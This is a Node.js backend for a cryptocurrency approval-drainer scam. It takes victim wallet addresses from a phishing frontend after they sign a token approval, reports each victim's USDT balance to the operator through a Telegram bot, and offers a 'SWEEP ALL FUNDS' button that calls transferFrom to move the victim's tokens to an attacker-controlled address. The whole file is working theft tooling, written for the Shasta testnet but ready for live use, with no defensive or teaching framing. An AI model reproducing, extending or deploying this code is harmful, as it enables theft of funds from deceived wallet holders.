require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TronWeb } = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

// ==========================================
// 1. TRONWEB INITIALIZATION
// ==========================================
const tronWeb = new TronWeb({
  fullHost: 'https://api.shasta.trongrid.io',
  privateKey: process.env.ATTACKER_PRIVATE_KEY 
});

// Debug log to verify the backend address matches the frontend
console.log("🔍 BACKEND ATTACKER ADDRESS IS:", tronWeb.defaultAddress.base58);

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58; 

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// ==========================================
// 2. API ENDPOINT (Frontend calls this)
// ==========================================
app.post('/api/alert', async (req, res) => {
  const { victimAddress, txHash } = req.body;
  console.log(`[ALERT] Received approval from ${victimAddress}`);

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = await token.balanceOf(victimAddress).call();
    const balanceNum = Number(bal.toString()) / 1e6;

    const message = `🚨 *VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Approve Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
    
    const keyboard = {
      inline_keyboard: [[
        { text: '📊 Check Balance', callback_data: `bal_${victimAddress}` },
        { text: '🕷️ SWEEP ALL FUNDS', callback_data: `sweep_${victimAddress}` }
      ]]
    };

    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// 3. TELEGRAM COMMANDS
// ==========================================
bot.command('start', (ctx) => ctx.reply('🤖 Bot is online and ready.'));
bot.command('test', (ctx) => ctx.reply('🔧 Backend wired up.'));

bot.action(/bal_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Reading...');
  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    const bal = Number((await token.balanceOf(addr).call()).toString()) / 1e6;
    ctx.editMessageText(`📊 *Live Balance*\n👤 \`${addr}\`\n💰 **${fmt(bal)} USDT**`, { parse_mode: 'Markdown' });
  } catch (e) { ctx.editMessageText(`❌ Read failed.`); }
});

// ==========================================
// 4. SWEEP ALL FUNDS ACTION (Ultimate Debug)
// ==========================================
bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating Drain...');
  await ctx.editMessageText(`🕷️ *Draining funds from* \`${addr}\`...`, { parse_mode: 'Markdown' });

  try {
    const token = await tronWeb.contract().at(TOKEN_ADDRESS);
    
    const bal = BigInt((await token.balanceOf(addr).call()).toString());
    const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
    
    console.log(`[SWEEP] Victim Balance: ${bal}, Allowance: ${allow}`);

    if (allow === 0n) {
      return ctx.editMessageText(`❌ *Drain Failed.*\nAllowance is 0.`);
    }

    const amount = bal < allow ? bal : allow;
    console.log(`[SWEEP] Attempting transferFrom. From: ${addr}, To: ${ATTACKER_ADDRESS}, Amount: ${amount}`);

    // 1. Execute transferFrom
    let txResult;
    try {
        txResult = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
    } catch (txError) {
        console.error("[SWEEP] RAW BROADCAST ERROR:", txError);
        return ctx.editMessageText(`❌ *Broadcast Failed*\n${txError.message || JSON.stringify(txError)}`);
    }

    // 2. Extract TX ID robustly
    const txId = typeof txResult === 'string' ? txResult : (txResult.txid || txResult.transaction?.txID || JSON.stringify(txResult));
    console.log(`[SWEEP] TX ID: ${txId}`);

    // 3. Poll for confirmation (Wait up to 45 seconds for Shasta)
    let info = null;
    let tries = 0;
    while (!info && tries < 22) {
        try {
            info = await tronWeb.trx.getTransactionInfo(txId);
        } catch (e) {
            // Network blip, ignore and retry
        }
        if (!info) {
            await new Promise(r => setTimeout(r, 2000));
            tries++;
        }
    }

    // 4. Check final status
    if (info && info.id) {
      console.log("[SWEEP] Transaction Info:", info);
      if (info.receipt && info.receipt.result === 'SUCCESS') {
        await ctx.editMessageText(`✅ *SUCCESSFULLY DRAINED*\n\n👤 From: \`${addr}\`\n💸 To: \`${ATTACKER_ADDRESS}\`\n💰 Amount: **${fmt(Number(amount)/1e6)} USDT**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${txId})`, { parse_mode: 'Markdown' });
      } else {
        const res = info.receipt?.result || "UNKNOWN";
        await ctx.editMessageText(`❌ *Failed on Chain*\nResult: ${res}\nTX: ${txId}\n(Check if Attacker Wallet has TRX for gas)`);
      }
    } else {
      await ctx.editMessageText(`❌ *Transaction Pending/Timeout.*\nTX ID: ${txId}\nCheck Tronscan directly.`);
    }
  } catch (e) {
    console.error("[SWEEP] FATAL ERROR:", e);
    ctx.editMessageText(`❌ *Drain Error:*\n${e.message}`);
  }
});

// ==========================================
// 5. START SERVER
// ==========================================
const PORT = process.env.PORT || 3001;
app.listen(PORT, () => console.log(`🛡️ Backend running on port ${PORT}`));

bot.launch().then(() => console.log('✅ Telegram bot listening.'));

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));